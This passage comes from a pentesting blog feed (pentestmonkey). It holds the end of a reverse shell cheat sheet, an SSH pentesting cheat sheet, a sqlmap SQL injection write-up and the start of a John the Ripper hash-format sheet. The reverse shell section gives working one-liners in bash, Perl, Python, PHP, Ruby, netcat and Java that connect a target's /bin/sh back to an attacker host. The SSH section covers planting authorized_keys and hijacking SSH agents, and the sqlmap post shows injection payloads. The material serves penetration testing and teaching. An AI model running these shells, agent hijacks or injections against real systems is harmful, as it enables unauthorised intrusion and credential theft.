<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here&#8217;s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There&#8217;s also anÂ <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3. Â This worked on my test system. Â If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session. Â The following command should be run on the server. Â It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001). Â One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo&#8217;s Reverse Shell One-Liners</a>. Â He has some alternative approaches and doesn&#8217;t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There&#8217;s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>. Â Gawk is not something that I&#8217;ve ever used myself. Â However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>SSH Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 28 Aug 2011 16:00:06 +0000</pubDate>
				<category><![CDATA[Cheat Sheets]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=194</guid>

					<description><![CDATA[SSH has several features that are useful during pentesting and auditing. Â This page aims to remind us of the syntax for the most useful features. NB: This page does not attempt to replace the man page for pentesters, only toÂ supplementÂ it with some pertinent examples. SOCKS Proxy Set up a SOCKS proxy on 127.0.0.1:1080 that lets [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>SSH has several features that are useful during pentesting and auditing. Â This page aims to remind us of the syntax for the most useful features.</p>
<p>NB: This page does not attempt to replace the <a href="http://www.openssh.org/manual.html">man page</a> for pentesters, only toÂ supplementÂ it with some pertinent examples.</p>
<h2>SOCKS Proxy</h2>
<p>Set up a SOCKS proxy on 127.0.0.1:1080 that lets you pivot through the remote host (10.0.0.1):</p>
<p><strong>Command line:</strong></p>
<pre>ssh -D 127.0.0.1:1080 10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>Host 10.0.0.1
DynamicForward 127.0.0.1:1080</pre>
<p><strong></strong>You can then use tsocks or similar to use non-SOCKS-aware tools on hosts accessible from 10.0.0.1:</p>
<pre>tsocks rdesktop 10.0.0.2</pre>
<h2>Local Forwarding</h2>
<p>Make services on the remote network accessible to your host via a local listener.</p>
<p>NB: Remember that you need to be root to bind to TCP port &lt;1024. Â Higher ports are used in the examples below.</p>
<h3>Example 1</h3>
<p>The service running on the remote host on TCP port 1521 is accessible by connecting to 10521 on the SSH client system.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -L 127.0.0.1:10521:127.0.0.1:1521Â user@10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 127.0.0.1:10521 127.0.0.1:1521</pre>
<h3>Example 2</h3>
<p>Same thing, but other hosts on the same network as the SSH client can also connect to the remote service (can be insecure).</p>
<p><strong>Command line:</strong></p>
<pre>ssh -LÂ 0.0.0.0:10521:127.0.0.1:1521 10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 0.0.0.0:10521 127.0.0.1:1521</pre>
<h3>Example 3</h3>
<p>In this example, 10.0.0.99 is a host that&#8217;s accessible from the SSH server. Â We can access the service it&#8217;s running on TCP port 1521 by connecting to 10521 on the SSH client.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -L 127.0.0.1:10521:10.0.0.99:1521 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 127.0.0.1:10521 10.0.0.99:1521</pre>
<h2>Remote Forwarding</h2>
<p>Make services on your local system / local network accessible to the remote host via a remote listener. Â This sounds like an odd thing to want to do, but perhaps you want to expose a services that lets you download your tools.</p>
<p>NB: Remember that you need to be root to bind to TCP port &lt;1024. Â Higher ports are used in the examples below.</p>
<h3>Example 1</h3>
<p>The SSH server will be able to access TCP port 80 on the SSH client by connecting to 127.0.0.1:8000 on the SSH server.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -RÂ 127.0.0.1:8000:127.0.0.1:80 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 127.0.0.1:8000 127.0.0.1:80</pre>
<h3>Example 2</h3>
<p>The SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to 127.0.0.1:8000 on the SSH server.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -RÂ 127.0.0.1:8000:172.16.0.99:80 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 127.0.0.1:8000 172.16.0.99:80</pre>
<h3>Example 3</h3>
<p>The SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to TCP port 8000 on the SSH server. Â Any other hosts able to connect to TCP port 8000 on the SSH server will also be able to access 172.16.0.99:80. Â This can sometimes be insecure.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -RÂ 0.0.0.0:8000:172.16.0.99:80Â 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 0.0.0.0:8000 172.16.0.99:80</pre>
<h2>Configuration Files</h2>
<h3>~/.ssh/config</h3>
<p>It&#8217;s sometimes easier to configure options on your SSH client system in ~/.ssh/config for hosts you use a lot rather than having to type out long command lines.</p>
<p>Using ~/.ssh/config also makes it easier to use other tools that use SSH (e.g. scp and rsync). Â It&#8217;s possible to tell other tools that SSH listens on a different port, but it&#8217;s a pain.</p>
<pre>Host 10.0.0.1
Port 2222
User ptm
ForwardX11 yes
DynamicForward 127.0.0.1:1080
RemoteForward 80 127.0.0.1:8000
LocalForward 1521 10.0.0.99:1521</pre>
<p>The above lines are explained more fully in the other subsection on this page.</p>
<h3>~/.ssh/authozied_keys</h3>
<p>During a pentest or audit, you might want to add an authorized_keys file to let you log in using an SSH key.</p>
<p>The authorized_keys file lives in a user&#8217;s home directory on the SSH server. Â It holds the public keys of the users allowed to log into that user&#8217;s account.</p>
<p>Generate a public/private key pair like this:</p>
<pre>ssh-keygen -f mykey
cat mykey.pub # you can copy this to authorized_keys</pre>
<p>If you want to shortest possible key (because your arbitrary-file-write vector is limited), do this:</p>
<pre>ssh-keygen -f mykey -t rsa -b 768
cat mykey.pub # copy to authorized_key. Â Omit the trailing user@host if you need a shorter key.</pre>
<p>Connect to the target system like this (you need to know the username of the user you added an authorized key for):</p>
<pre>ssh -i mykey user@10.0.0.1</pre>
<p>Caveat: The authorized_keys file might not work if it&#8217;s writable by other users. Â If you already have shell access you can &#8220;chmod 600 ~/.ssh/authorized_keys&#8221;. Â However, if you&#8217;re remotely exploiting an arbitrary file-write vulnerability and happen to have a weak umask, you may have problems.</p>
<h2>X11 Forwarding</h2>
<p>If your SSH client is also an X-Server then you can launch X-clients (e.g. Firefox) inside your SSH session and display them on your X-Server. Â This works well with from Linux X-Servers and from <a href="http://www.cygwin.com/">cygwin</a>&#8216;s X-server on Windows.</p>
<h3>Command Line:</h3>
<pre>SSH -X 10.0.0.1
SSH -Y 10.0.0.1 # less secure alternative - but faster</pre>
<h3>~/.ssh/config:</h3>
<pre>ForwardX11 yes
ForwardX11Trusted yes # less secure alternative - but faster</pre>
<h2>SSH Agents</h2>
<p>SSH agents can be used to hold your private SSH keys in memory. Â The agent will then authenticate you to any hosts that trust your SSH key.</p>
<p>This has the following advantages:</p>
<ul>
<li>You don&#8217;t have to keep entering your passphrase (if you chose to encrypt your private key)</li>
<li>But you still get to store your private SSH key in an encrypted format on disk.</li>
</ul>
<p>Using an SSH agent is probably more secure than storing your key in cleartext, but agents can be hijacked.</p>
<h3>Using an SSH Agent</h3>
<p>First start your agent:</p>
<pre>eval `ssh-agent`</pre>
<p>Then add your keys to it &#8211; you&#8217;ll need to enter your passphrase for any encrypted keys:</p>
<pre>ssh-add ~/dir/mykey</pre>
<h3>Hijacking SSH Agents</h3>
<p>If you see SSH agents running on a pentest (process called &#8220;ssh-agent&#8221;), you might be able to use it to authenticate you to other hosts &#8211; or other accounts on that host. Â Check out ~/.ssh/known_hosts for some ideas of where you might be able to connect to.</p>
<p>You can use any agents running under the account you compromised. Â If you&#8217;re root you can use any SSH agent.</p>
<p>SSH agents listen on a unix socket. Â You need to figure where this is for each agent (e.g.Â /tmp/ssh-tqiEl28473/agent.28473). You can then use the agent like this:</p>
<pre>export Â SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473
ssh-add -l # lists the keys loaded into the agent
ssh user@host # will authenticate you if server trusts key in agent</pre>
<p>This command illustrates how you could inspect the environment of every ssh-agent process on a Linux system. Â It should yield a list of unix sockets for SSH agents.</p>
<pre>ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '</pre>
<h3>Agent Forwarding</h3>
<p>If you enable SSH agent forwarding then you&#8217;ll be able to carry on using the SSH agent on your SSH client during your session on the SSH server. Â This is potentially insecure because so will anyone else who is root on the SSH server you&#8217;re connected to. Â Avoid using this feature with any keys you care about.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Exploiting A Tricky SQL Injection With sqlmap</title>
		<link>https://pentestmonkey.net/blog/exploiting-a-tricky-sql-injection-with-sqlmap</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 21 Aug 2011 16:13:41 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlmap]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=234</guid>

					<description><![CDATA[Like many pentesters, I&#8217;m a fan of sqlmap. Â It&#8217;s often the first and last tool I reach for when exploiting boolean or time-based SQL injection vulnerabilities. I wanted to briefly document a slightly tricky SQL injection issue I encountered recently and a few of the sqlmap features that impressed me most. I initially noticed that [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Like many pentesters, I&#8217;m a fan of <a href="http://sqlmap.sourceforge.net/">sqlmap</a>. Â It&#8217;s often the first and last tool I reach for when exploiting boolean or time-based SQL injection vulnerabilities.</p>
<p>I wanted to briefly document a slightly tricky SQL injection issue I encountered recently and a few of the sqlmap features that impressed me most.</p>
<p>I initially noticed that the following URLs returned the same page:</p>
<pre>http://host/script?id=10
http://host/script?id=11-1 # same as id=10
http://host/script?id=(select 10) # same as id=10</pre>
<p>Which looks pretty standard. The were a few problems with this injection, though. Firstly &#8220;and&#8221; and &#8220;or&#8221; didn&#8217;t work for some reason I never figured out:</p>
<pre> http://host/script?id=10 and 1=1 # failed</pre>
<p>Secondly, I could&#8217;t terminate the query</p>
<pre>http://host/script?id=10-- # failed
http://host/script?id=10;-- # failed
http://host/script?id=10);-- # failed
http://host/script?id=10)subquery;-- # failed</pre>
<p>I spent a long time trying to terminate the query in <a href="http://portswigger.net/burp/intruder.html">burp intruder</a> with a custom dictionary of possible strings. To no avail. I therefore could not make this into a UNION injection.</p>
<p>To exploit it as a boolean injection, I rewrote the URL slightly to help sqlmap &#8211; which was struggling because &#8220;and&#8221; and &#8220;or&#8221; didn&#8217;t work as they normally would:</p>
<pre> http://host/script?id=11-(case when 1=1 then 1 else 0 end)</pre>
<p>It was then possible to put &#8221; and 1=2&#8243; etc. after the &#8220;1=1&#8221; to give two different pages for the true or false response:</p>
<pre>http://host/script?id=11 # the "when" clause is false
http://host/script?id=10 # the "when" clause is true</pre>
<p>Apparently if you increase the &#8220;&#8211;level&#8221; parameter, sqlmap will try clever stuff like this for you. Â I bares illustrating how to do it manually, though.</p>
<h2>Telling sqlmap Where To Inject</h2>
<p>By default sqlmap will figure out for itself where the injection point it. If you want to guide it, simply add a * to the URL like this:</p>
<pre>sqlmap -u http://host/script?id=11-(case when 1=1* then 1)</pre>
<p>BTW I&#8217;m using <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/">SVN version</a>.Â  Apparently this feature was present in v0.9, but wasn&#8217;t documented. Â Use the docs from the SVN Â read about this feature.</p>
<p>It&#8217;s a brilliant feature. I probably wouldn&#8217;t have bothered with sqlmap if it didn&#8217;t have this feature.</p>
<h2>Error Correction</h2>
<p>For some reason, the server gave me inconsistent responses (load balancing / general brokenness?). This resulted in about 25% of the chars retrieve by sqlmap being incorrect &#8211; not the fault of the tool, but the fault of the server.</p>
<p>This is a problem not faced by sqlmap users when using time-based (&#8220;waitfor delay&#8221;) injection because sqlmap has a cool feature: error correction. Â After each character it extracts, it checks using a true/false query that the character is correct.</p>
<p>It wasn&#8217;t too hard to activate the error-correction feature for boolean injections too &#8211; in fact I changed a single line of code.</p>
<p>Sweet. Â Error-free data from the database.</p>
<p>I&#8217;ve mailed <a href="http://bernardodamele.blogspot.com/">Bernardo</a>, sqlmap&#8217;s author and hopefully we&#8217;ll see this as an optional feature in a future release. Â It does mean about 1/8th more queries will be required, but that&#8217;s a small price to pay when the server&#8217;s giving you bad data.</p>
<h2>Tamper Scripts</h2>
<p>To further complicate the injection, some characters needed URL encoding &#8211; e.g. &gt; to %3E. Â My instinct was to use &#8220;&#8211;tamper=between&#8221; which converts &#8220;&gt; 5&#8221; to &#8220;not between 0 and 5&#8221;. Â However, this made the query too long (a further trickyness of this particular injection).</p>
<p>It was fairly easy to create a custom tamper script based on one of the 20 plus examples that ship with sqlmap:</p>
<pre>cd sqlmap/tamper
cp between.py ptm.py
vi ptm.py
../sqlmap.py --tamper=ptm ...</pre>
<p><em>Update: In retrospect &#8211;tamper=charencode may have worked.</em></p>
<h2>Support</h2>
<p>I found <a href="http://bernardodamele.blogspot.com/">Bernardo</a> very helpful and welcoming of feedback*. Â He and Miroslav StamparÂ have done a great job on this tool. Â And it just keeps improving.</p>
<p>*Though, always RTFM (<a href="http://sqlmap.sourceforge.net/doc/README.pdf">v0.9</a> <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/doc/README.pdf">SVN version</a>) before contacting him <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>John The Ripper Hash Formats</title>
		<link>https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 06 Aug 2011 16:34:57 +0000</pubDate>
				<category><![CDATA[Cheat Sheets]]></category>
		<category><![CDATA[johntheripper]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=198</guid>

					<description><![CDATA[John the Ripper is a favourite password cracking tool of many pentesters. Â There is plenty of documentationÂ about its command line options. I&#8217;ve encountered the following problems using John the Ripper. Â These are not problems with the tool itself, but inherent problems with pentesting and password cracking in general. Sometimes I stumble across hashes on a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p><a href="http://www.openwall.com/john/">John the Ripper</a> is a favourite password cracking tool of many pentesters. Â There is plenty of <a href="http://www.openwall.com/john/doc/EXAMPLES.shtml">documentation</a>Â about its command line options.</p>
<p>I&#8217;ve encountered the following problems using John the Ripper. Â These are not problems with the tool itself, but inherent problems with pentesting and password cracking in general.</p>
<ul>
<li>Sometimes I stumble across hashes on a pentest, but don&#8217;t recognise the format, don&#8217;t know if it&#8217;s supported by john, or whether there are multiple &#8220;&#8211;format&#8221; options I should try.</li>
<li>The hashes you collect on a pentest sometimes need munging into a different format&#8230; but what&#8217;s the format john is expecting?</li>
<li>John will occasionallyÂ recogniseÂ your hashes as the wrong type (e.g. &#8220;Raw MD5&#8221; as &#8220;LM DES&#8221;). Â This is inevitable because some hashes look identical.</li>
<li>Sometimes I gain access to a system, but can&#8217;t recall how to recover the password hashes for that particular application / OS.</li>
</ul>
<p>These problems can all be sorted with a bit of googling or grepping through the john source code. Â I thought it might be helpful to compile a cheat sheet to reduce the amount of time I spend grepping and googling.</p>
<p>In the first release of this page I&#8217;ve:</p>
<ul>
<li>Copied example hashes out of the source code for most supported hash types.</li>
<li>Provided examples of what your hashes.txt file might look like (though I&#8217;m sure other variations are supported that aren&#8217;t covered here yet).</li>
<li>For each example hash I&#8217;ve stated whether it will be automatically recognised by john, or whether you&#8217;ll have to use the &#8220;&#8211;format&#8221; option (in which case I&#8217;ve included which &#8211;format option you need)</li>
</ul>
<p>I haven&#8217;t yet done the following:</p>
<ul>
<li>Added reminders on how hashes can be collected.</li>
<li>Added information on how to munge the hashes into a format supported by john.</li>
</ul>
<p>This sheet was originally based onÂ <a href="http://www.openwall.com/john/g/john-1.7.8-jumbo-5.tar.gz">john-1.7.8-jumbo-5</a>. Â Changes in supported hashes or hash formats since then may not be reflected on this page.</p>
<h2>afs &#8211; Kerberos AFS DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$K4$a8dc8aeaa2c48a97,
$ john hashes.txt
$ john --format=afs hashes.txt</pre>
<pre>$ cat hashes.txt
username:$K4$a8dc8aeaa2c48a97,
$ john hashes.txt
$ john --format=afs hashes.txt</pre>
<pre>$ cat hashes.txt
username:$K4$a8dc8aeaa2c48a97,:::::::
$ john hashes.txt
$ john --format=afs hashes.txt</pre>
<h2>bfegg &#8211; Eggdrop</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
+C/.8o.Wuph9.
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=bfegg hashes.txt</pre>
<pre>$ cat hashes.txt
username:+C/.8o.Wuph9.
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=bfegg hashes.txt</pre>
<pre>$ cat hashes.txt
username:+C/.8o.Wuph9.:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=bfegg hashes.txt</pre>
<h2>bf &#8211; OpenBSD Blowfish</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$2a$05$CCCCCCCCCCCCCCCCCCCCC.7uG0VCzI2bS7j6ymqJi9CdcdxiRTWNy
$ john hashes.txt
$ john --format=bf hashes.txt</pre>
<pre>$ cat hashes.txt
username:$2a$05$CCCCCCCCCCCCCCCCCCCCC.7uG0VCzI2bS7j6ymqJi9CdcdxiRTWNy
$ john hashes.txt
$ john --format=bf hashes.txt</pre>
<pre>$ cat hashes.txt
username:$2a$05$CCCCCCCCCCCCCCCCCCCCC.7uG0VCzI2bS7j6ymqJi9CdcdxiRTWNy:::::::
$ john hashes.txt
$ john --format=bf hashes.txt</pre>
<h2>bsdi &#8211; BSDI DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
_J9..SDSD5YGyRCr4W4c
$ john hashes.txt
$ john --format=bsdi hashes.txt</pre>
<pre>$ cat hashes.txt
username:_J9..SDSD5YGyRCr4W4c
$ john hashes.txt
$ john --format=bsdi hashes.txt</pre>
<pre>$ cat hashes.txt
username:_J9..SDSD5YGyRCr4W4c:::::::
$ john hashes.txt
$ john --format=bsdi hashes.txt</pre>
<h2>crypt &#8211; generic crypt(3)</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
SDbsugeBiC58A
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=crypt hashes.txt</pre>
<pre>$ cat hashes.txt
username:SDbsugeBiC58A
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=crypt hashes.txt</pre>
<pre>$ cat hashes.txt
username:SDbsugeBiC58A:::::::
$ john hashes.txt # Doesn't work.  JTR detects hash as "Traditional DES".
$ john --format=crypt hashes.txt</pre>
<h2>des &#8211; Traditional DES</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
SDbsugeBiC58A
$ john hashes.txt
$ john --format=des hashes.txt</pre>
<pre>$ cat hashes.txt
username:SDbsugeBiC58A
$ john hashes.txt
$ john --format=des hashes.txt</pre>
<pre>$ cat hashes.txt
username:SDbsugeBiC58A:::::::
$ john hashes.txt
$ john --format=des hashes.txt</pre>
<h2>dmd5 &#8211; DIGEST-MD5</h2>
<h3>Supported Hash Formats</h3>
<p>TODO: No working example yet.</p>
<h2>dominosec &#8211; More Secure Internet Password</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
(GVMroLzc50YK/Yd+L8KH)
$ john hashes.txt
$ john --format=dominosec hashes.txt</pre>
<pre>$ cat hashes.txt
username:(GVMroLzc50YK/Yd+L8KH)
$ john hashes.txt
$ john --format=dominosec hashes.txt</pre>
<pre>$ cat hashes.txt
username:(GVMroLzc50YK/Yd+L8KH):::::::
$ john hashes.txt
$ john --format=dominosec hashes.txt</pre>
<h2>&lt;none&gt; &#8211; EPiServer SID Hashes</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
0x5F1D84A6DE97E2BEFB637A3CB5318AFEF0750B856CF1836BD1D4470175BE 0x4D5EFDFA143EDF74193076F174AC47CEBF2F417F
$ john hashes.txt
$ # NB: There is no --format option for this hash type</pre>
<pre>$ cat hashes.txt
username:0x5F1D84A6DE97E2BEFB637A3CB5318AFEF0750B856CF1836BD1D4470175BE 0x4D5EFDFA143EDF74193076F174AC47CEBF2F417F
$ john hashes.txt
$ # NB: There is no --format option for this hash type</pre>
<pre>$ cat hashes.txt
username:0x5F1D84A6DE97E2BEFB637A3CB5318AFEF0750B856CF1836BD1D4470175BE 0x4D5EFDFA143EDF74193076F174AC47CEBF2F417F:::::::
$ john hashes.txt
$ # NB: There is no --format option for this hash type</pre>
<h2>hdaa &#8211; HTTP Digest access authentication</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$response$679066476e67b5c7c4e88f04be567f8b$user$myrealm$GET$/$8c12bd8f728afe56d45a0ce846b70e5a$00000001$4b61913cec32e2c9$auth
$ john hashes.txt
$ john --format=hdaa hashes.txt</pre>
<pre>$ cat hashes.txt
username:$response$679066476e67b5c7c4e88f04be567f8b$user$myrealm$GET$/$8c12bd8f728afe56d45a0ce846b70e5a$00000001$4b61913cec32e2c9$auth
$ john hashes.txt
$ john --format=hdaa hashes.txt</pre>
<pre>$ cat hashes.txt
username:$response$679066476e67b5c7c4e88f04be567f8b$user$myrealm$GET$/$8c12bd8f728afe56d45a0ce846b70e5a$00000001$4b61913cec32e2c9$auth:::::::
$ john hashes.txt
$ john --format=hdaa hashes.txt</pre>
<h2>hmac-md5 &#8211; HMAC MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
what do ya want for nothing?#750c783e6ab0b503eaa86e310a5db738
$ john hashes.txt
$ john --format=hmac-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:what do ya want for nothing?#750c783e6ab0b503eaa86e310a5db738
$ john hashes.txt
$ john --format=hmac-md5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:what do ya want for nothing?#750c783e6ab0b503eaa86e310a5db738:::::::
$ john hashes.txt
$ john --format=hmac-md5 hashes.txt</pre>
<h2>hmailserver &#8211; hmailserver</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
cc06fa688a64cdeea43d3c0fb761fede7e3ccf00a9daea9c79f7d458e06f88327f16dd
$ john hashes.txt
$ john --format=hmailserver hashes.txt</pre>
<pre>$ cat hashes.txt
username:cc06fa688a64cdeea43d3c0fb761fede7e3ccf00a9daea9c79f7d458e06f88327f16dd
$ john hashes.txt
$ john --format=hmailserver hashes.txt</pre>
<pre>$ cat hashes.txt
username:cc06fa688a64cdeea43d3c0fb761fede7e3ccf00a9daea9c79f7d458e06f88327f16dd:::::::
$ john hashes.txt
$ john --format=hmailserver hashes.txt</pre>
<h2>ipb2 &#8211; IPB2 MD5</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$IPB2$2e75504633$d891f03a7327639bc632d62a7f302604
$ john hashes.txt
$ john --format=ipb2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$IPB2$2e75504633$d891f03a7327639bc632d62a7f302604
$ john hashes.txt
$ john --format=ipb2 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$IPB2$2e75504633$d891f03a7327639bc632d62a7f302604:::::::
$ john hashes.txt
$ john --format=ipb2 hashes.txt</pre>
<h2>krb4 &#8211; Kerberos v4 TGT</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$af$ENGIN.UMICH.EDU$44feffd06e68e30bc8890e253760858d
$ john hashes.txt
$ john --format=krb4 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$af$ENGIN.UMICH.EDU$44feffd06e68e30bc8890e253760858d
$ john hashes.txt
$ john --format=krb4 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$af$ENGIN.UMICH.EDU$44feffd06e68e30bc8890e253760858d:::::::
$ john hashes.txt
$ john --format=krb4 hashes.txt</pre>
<h2>krb5 &#8211; Kerberos v5 TGT</h2>
<h3>Supported Hash Formats</h3>
<pre>$ cat hashes.txt
$krb5$oskov$ACM.UIUC.EDU$4730d7249765615d6f3652321c4fb76d09fb9cd06faeb0c31b8737f9fdfcde4bd4259c31cb1dff25df39173b09abdff08373302d99ac09802a290915243d9f0ea0313fdedc7f8d1fae0d9df8f0ee6233818d317f03a72c2e77b480b2bc50d1ca14fba85133ea00e472c50dbc825291e2853bd60a969ddb69dae35b604b34ea2c2265a4ffc72e9fb811da17c7f2887ccb17e2f87cd1f6c28a9afc0c083a9356a9ee2a28d2e4a01fc7ea90cc8836b8e25650c3a1409b811d0bad42a59aa418143291d42d7b1e6cb5b1876a4cc758d721323a762e943f774630385c9faa68df6f3a94422f97
$ john hashes.txt
$ john --format=krb5 hashes.txt</pre>
<pre>$ cat hashes.txt
username:$krb5$oskov$ACM.UIUC.EDU$4730d7249765615d6f3652321c4fb76d09fb9cd06faeb0c31b8737f9fdfcde4bd4259c31cb1dff25df39173b09abdff08373302d99ac09802a290915243d9f0ea0313fdedc7f8d1fae0d9df8f0ee6233818d317f03a72c2e77b480b2bc50d1ca14fba85133ea00e472c50dbc825291e2853bd60a969ddb69dae35b604b34ea2c2265a4ffc72e9fb811da17c7f2887ccb17e2f87cd1f6c28a9afc0c083a9356a9ee2a28d2e4a01fc7ea90cc8836b8e25650c3a1409b811d0bad42a59aa418143291d42d7b1e6cb5b1876a4cc758d721323a762e943f774630385c9faa68df6f3a94422f97
$ john hashes.txt
$ john --format=krb5 hashes.txt</pre>
<pre>$ cat hashes.txt
